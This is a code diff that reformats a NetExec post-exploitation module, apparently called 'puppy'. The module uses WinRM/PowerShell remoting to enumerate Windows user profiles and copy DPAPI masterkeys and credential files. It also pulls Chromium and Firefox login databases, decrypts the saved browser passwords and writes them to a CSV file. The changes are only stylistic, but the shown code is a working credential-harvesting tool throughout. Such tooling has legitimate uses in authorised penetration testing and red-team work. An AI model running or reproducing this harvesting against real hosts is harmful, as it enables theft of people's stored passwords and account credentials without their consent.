@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 import os
 import re
 import csv
@@ -9,7 +8,6 @@ import tempfile
 
 from pathlib import Path
 from binascii import unhexlify
-from typing import List, Tuple, Optional
 from Cryptodome.Cipher import DES3
 from pyasn1.codec.der import decoder
 from dploot.triage.browser import BrowserTriage
@@ -18,6 +16,7 @@ from dploot.lib.masterkey import Masterkey as DPMasterkey
 from impacket.uuid import bin_to_string
 from impacket.dpapi import MasterKeyFile, MasterKey, deriveKeysFromUser, DPAPI_BLOB, CredentialFile, CREDENTIAL_BLOB
 from nxc.helpers.misc import CATEGORY
+
 
 class NXCModule:
     """
@@ -44,7 +43,7 @@ class NXCModule:
         self.dst = module_options.get("DST")
         self.recurse = str(module_options.get("RECURSE", "false")).lower() in ("1", "true", "yes", "y")
         self.ff_master_password = (module_options.get("MP") or "").strip()
-        
+
     # ======================== small helpers ========================
     def _win_norm(self, p: str) -> str:
         return str(p).replace("\\", "/")
@@ -67,6 +66,7 @@ class NXCModule:
     # ======================== PSRP helpers ========================
     def _psrp_open(self, host, domain, username, password, port=5985, use_https=False):
         from pypsrp.wsman import WSMan
+
         scheme = "https" if use_https else "http"
         upn = f"{domain}\\{username}" if domain else username
         return WSMan(
@@ -84,6 +84,7 @@ class NXCModule:
 
     def _ps_invoke(self, pool, script, params=None):
         from pypsrp.powershell import PowerShell
+
         ps = PowerShell(runspace_pool=pool)
         ps.add_script(script)
         if params:
@@ -107,23 +108,18 @@ class NXCModule:
             return self._name
 
     class DPLootWinRMConnection:
-
-
         def __init__(self, mod_self, pool):
             self._mod = mod_self
             self.pool = pool
             try:
                 from dploot.lib.consts import FALSE_POSITIVES
+
                 self.false_positive = set(FALSE_POSITIVES)
             except Exception:
                 self.false_positive = {".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users"}
 
         def list_users(self, share: str):
-
-            '''
-            Get users from remote host via C:\\Users
-            '''
-
+            """Get users from remote host via C:\\Users"""
             script = r"""
             $ErrorActionPreference="SilentlyContinue"
             Get-ChildItem -LiteralPath 'C:\Users' -Force -Directory | Select-Object -ExpandProperty Name
@@ -134,11 +130,7 @@ class NXCModule:
             return [n for n in names if n not in self.false_positive]
 
         def remote_list_dir(self, share, path, wildcard=True):
-
-            '''
-            Enumeration of directory C:\ 
-            '''
-
+            """Enumeration of directory C:\ """
             script = r"""
             param([string]$Rel,[bool]$Wildcard=$true)
             $ErrorActionPreference="SilentlyContinue"
@@ -160,12 +152,12 @@ class NXCModule:
                 if not s:
                     continue
                 kind, name = (s.split("|", 1) + [""])[:2]
-                is_dir = (kind == "D")
+                is_dir = kind == "D"
                 entries.append(NXCModule._FakeSharedEntry(name=name, is_dir=is_dir))
             return entries
 
         def readFile(self, shareName, path, mode=None, offset=0, **_):
-            full = f"C:\\{str(path).replace('/','\\').lstrip('\\')}"
+            full = f"C:\\{str(path).replace('/', '\\').lstrip('\\')}"
             return self._mod._read_remote_bytes(self.pool, full, offset=offset, soft_missing=True)
 
         def is_admin(self):
@@ -195,18 +187,12 @@ class NXCModule:
     }finally{ if($fs){$fs.Dispose()} }
     """
 
-    def _read_remote_bytes(self, pool, abs_path: str, chunk=1024*1024, offset=0, soft_missing=True, PS_READ_BYTES=PS_READ_BYTES) -> bytes:
-        chunks = self._ps_invoke(pool, PS_READ_BYTES, {
-            "Path": abs_path, "Chunk": int(chunk), "Offset": int(offset), "SoftMissing": bool(soft_missing)
-        })
+    def _read_remote_bytes(self, pool, abs_path: str, chunk=1024 * 1024, offset=0, soft_missing=True, PS_READ_BYTES=PS_READ_BYTES) -> bytes:
+        chunks = self._ps_invoke(pool, PS_READ_BYTES, {"Path": abs_path, "Chunk": int(chunk), "Offset": int(offset), "SoftMissing": bool(soft_missing)})
         return b"".join(base64.b64decode(str(b)) for b in chunks if b)
-    
-    def _discover_user_env(self, pool):
-        
-        '''
-        Getting SID, user, %APPDATA% dir and hostname
-        '''
 
+    def _discover_user_env(self, pool):
+        """Getting SID, user, %APPDATA% dir and hostname"""
         script = r"""
         $ErrorActionPreference="Stop"
         $sid = (whoami /user | Select-String -Pattern 'S-\d-\d+-(\d+-){1,}\d+$').Matches.Value
@@ -222,17 +208,16 @@ class NXCModule:
         js = str(raw[0]) if raw else "{}"
         try:
             import json as _json
+
             return _json.loads(js)
         except Exception:
             return {}
 
-    def _enumerate_files(self, pool, remote_path, recurse=False) -> List[str]:
-
-        '''
+    def _enumerate_files(self, pool, remote_path, recurse=False) -> list[str]:
+        """
         If object is dir return files from there
         If the object is a file, it returns the file unchanged
-        '''
-
+        """
         script = r"""
         param([string]$Path,[bool]$Recurse=$false)
         if (-not (Test-Path -LiteralPath $Path)) { return @() }
@@ -246,26 +231,16 @@ class NXCModule:
         out = self._ps_invoke(pool, script, {"Path": remote_path, "Recurse": recurse})
         return [str(x) for x in out]
 
-    def _download_one(self, pool, remote_file, local_file, chunk_bytes=1024*1024) -> bool:
-
-        '''
-        Downloading remote files
-        '''
-
+    def _download_one(self, pool, remote_file, local_file, chunk_bytes=1024 * 1024) -> bool:
+        """Downloading remote files"""
         data = self._read_remote_bytes(pool, remote_file, chunk=chunk_bytes, soft_missing=False)
         Path(local_file).parent.mkdir(parents=True, exist_ok=True)
         Path(local_file).write_bytes(data)
         return True
-    
-    
 
     # ======================== Chromium minimal enumeration (без cookies) ========================
-    def _chromium_minimal_targets(self, pool) -> List[str]:
-        
-        '''
-        Retrieves the list of absolute paths to Chromium browser files
-        '''
-
+    def _chromium_minimal_targets(self, pool) -> list[str]:
+        """Retrieves the list of absolute paths to Chromium browser files"""
         script = r"""
         $ErrorActionPreference="Stop"
         $roots = @(
@@ -312,7 +287,6 @@ class NXCModule:
 
     # ======================== dploot masterkeys ========================
     def _build_dploot_masterkeys(self, context, base_dst: Path, sid: str, password: str):
-        
         protect_dir = base_dst / self._safe_name(sid)
         if not protect_dir.exists():
             context.log.display(f"[puppy] no Protect dir at {protect_dir}, skip building dploot masterkeys")
@@ -356,8 +330,7 @@ class NXCModule:
         return mkeys
 
     # ======================== dploot triage wrapper (Chromium creds) ========================
-    def _triage_browsers_via_dploot(self, context, pool, base_dst: Path, connection, masterkeys: list, lines_out: List[str]) -> int:
-        
+    def _triage_browsers_via_dploot(self, context, pool, base_dst: Path, connection, masterkeys: list, lines_out: list[str]) -> int:
         tgt = Target.create(
             domain=getattr(connection, "domain", "") or "",
             username=getattr(connection, "username", "") or "",
@@ -410,29 +383,27 @@ class NXCModule:
                 w = csv.writer(fw)
                 w.writerow(["winuser", "browser", "url", "username", "password"])
                 for c in creds:
-                    w.writerow(
-                        [
-                            getattr(c, "winuser", ""),
-                            getattr(c, "browser", ""),
-                            getattr(c, "url", ""),
-                            getattr(c, "username", ""),
-                            getattr(c, "password", ""),
-                        ]
-                    )
+                    w.writerow([
+                        getattr(c, "winuser", ""),
+                        getattr(c, "browser", ""),
+                        getattr(c, "url", ""),
+                        getattr(c, "username", ""),
+                        getattr(c, "password", ""),
+                    ])
         except Exception as e:
             context.log.fail(f"[puppy] failed writing logins.csv: {e}")
 
         return len(collected)
 
     # ======================== Firefox triage ========================
-    def _ff_parse_profiles_ini(self, raw_bytes: bytes) -> List[str]:
+    def _ff_parse_profiles_ini(self, raw_bytes: bytes) -> list[str]:
         """Разбор profiles.ini -> список относительных путей профилей."""
         text = raw_bytes.decode("utf-8", "ignore").splitlines()
         curr = {}
         profiles = []
         for line in text:
             line = line.strip()
-            if not line or line.startswith(";") or line.startswith("#"):
+            if not line or line.startswith((";", "#")):
                 continue
             if line.startswith("[") and line.endswith("]"):
                 if curr:
@@ -448,9 +419,10 @@ class NXCModule:
             profiles.append(curr["Path"])
         return profiles
 
-    def _ff_decode_login_data(self, data_b64: str) -> Tuple[bytes, bytes, bytes]:
+    def _ff_decode_login_data(self, data_b64: str) -> tuple[bytes, bytes, bytes]:
         from base64 import b64decode
         from pyasn1.codec.der import decoder
+
         asn1data = decoder.decode(b64decode(data_b64))
         return (
             asn1data[0][0].asOctets(),
@@ -462,6 +434,7 @@ class NXCModule:
         import hmac
         from hashlib import sha1, pbkdf2_hmac
         from Cryptodome.Cipher import DES3, AES
+
         pbeAlgo = str(decoded_item[0][0][0])
         if pbeAlgo == "1.2.840.113549.1.12.5.1.3":
             entry_salt = decoded_item[0][0][1][0].asOctets()
@@ -492,7 +465,7 @@ class NXCModule:
         else:
             return b""
 
-    def _ff_get_key_from_key4(self, key4_data: bytes, mp_candidates: List[bytes], context) -> Optional[bytes]:
+    def _ff_get_key_from_key4(self, key4_data: bytes, mp_candidates: list[bytes], context) -> bytes | None:
         fh = tempfile.NamedTemporaryFile(delete=False)
         db = None
         try:
@@ -561,7 +534,7 @@ class NXCModule:
         except Exception:
             return data
 
-    def _firefox_triage_winrm(self, context, pool, base_dst: Path, connection, lines_out: List[str]) -> int:
+    def _firefox_triage_winrm(self, context, pool, base_dst: Path, connection, lines_out: list[str]) -> int:
         conn = self.DPLootWinRMConnection(self, pool)
         users = conn.list_users("C$") or []
         users = [u for u in users if u not in getattr(conn, "false_positive", set())]
@@ -627,13 +600,13 @@ class NXCModule:
 
             for prof_rel in sorted(profile_dirs):
                 prof_name = prof_rel.split("\\")[-1]
-                prof_out = (out_root / self._safe_name(prof_name))
+                prof_out = out_root / self._safe_name(prof_name)
                 prof_out.mkdir(parents=True, exist_ok=True)
                 p_key4 = f"{prof_rel}\\key4.db"
                 p_logins = f"{prof_rel}\\logins.json"
                 extras = [f"{prof_rel}\\places.sqlite", f"{prof_rel}\\formhistory.sqlite"]
 
-                def _save_if_exists(remote_path: str, local_name: str) -> Optional[bytes]:
+                def _save_if_exists(remote_path: str, local_name: str) -> bytes | None:
                     try:
                         data = conn.readFile("C$", remote_path, bypass_shared_violation=True)
                         if data:
@@ -680,8 +653,7 @@ class NXCModule:
         return found
 
     # ======================== DPAPI decrypt of Credentials ========================
-    def _decrypt_dpapi_files(self, context, base_dst: Path, sid: str, password: str, username: str) -> Tuple[List[str], int, int]:
-
+    def _decrypt_dpapi_files(self, context, base_dst: Path, sid: str, password: str, username: str) -> tuple[list[str], int, int]:
         def _norm_guid_str(g):
             if isinstance(g, bytes):
                 g = g.decode("utf-16le", errors="ignore")
@@ -694,7 +666,7 @@ class NXCModule:
             return re.fullmatch(r"[0-9a-fA-F]{8}(?:-[0-9a-fA-F]{4}){3}-[0-9a-fA-F]{12}", name) is not None
 
         protect_dir = base_dst / self._safe_name(sid)
-        master_keys = {} 
+        master_keys = {}
         if protect_dir.exists():
             seen = set()
             for mk_path in protect_dir.iterdir():
@@ -807,10 +779,10 @@ class NXCModule:
             context.log.extra["port"] = str(p)
         except Exception:
             context.log.extra["port"] = "5985"
-    
-        lines_dpapi: List[str] = []
-        lines_chromium: List[str] = []
-        lines_firefox: List[str] = []
+
+        lines_dpapi: list[str] = []
+        lines_chromium: list[str] = []
+        lines_firefox: list[str] = []
 
         context.log.highlight("[puppy] auto-discovery mode starting")
 
@@ -820,9 +792,9 @@ class NXCModule:
         base_dst = base_dst.expanduser().absolute()
         base_dst.mkdir(parents=True, exist_ok=True)
 
-        '''
+        """
         Connecting to PSRP
-        '''
+        """
 
         try:
             wsman = self._psrp_open(
@@ -911,11 +883,11 @@ class NXCModule:
                     dst_dir = base_dst / "chromium"
                     for rf in chromium_files:
                         try:
-                            m = re.search(r'(Google\\Chrome|Microsoft\\Edge|BraveSoftware\\Brave-Browser|Chromium)\\User Data[\\/](.*)$', rf, flags=re.IGNORECASE)
+                            m = re.search(r"(Google\\Chrome|Microsoft\\Edge|BraveSoftware\\Brave-Browser|Chromium)\\User Data[\\/](.*)$", rf, flags=re.IGNORECASE)
                             if m:
                                 rel = f"{m.group(1)}\\User Data\\{m.group(2)}"
                             else:
-                                m2 = re.search(r'User Data[\\/](.*)$', rf, flags=re.IGNORECASE)
+                                m2 = re.search(r"User Data[\\/](.*)$", rf, flags=re.IGNORECASE)
                                 rel = f"UnknownVendor\\User Data\\{m2.group(1)}" if m2 else self._win_basename(rf)
                             rel = rel.replace("\\", "/")
                             out_path = dst_dir / self._safe_name(rel).replace("__", "_")
@@ -971,4 +943,3 @@ class NXCModule:
                 pool.close()
             except Exception:
                 pass
-
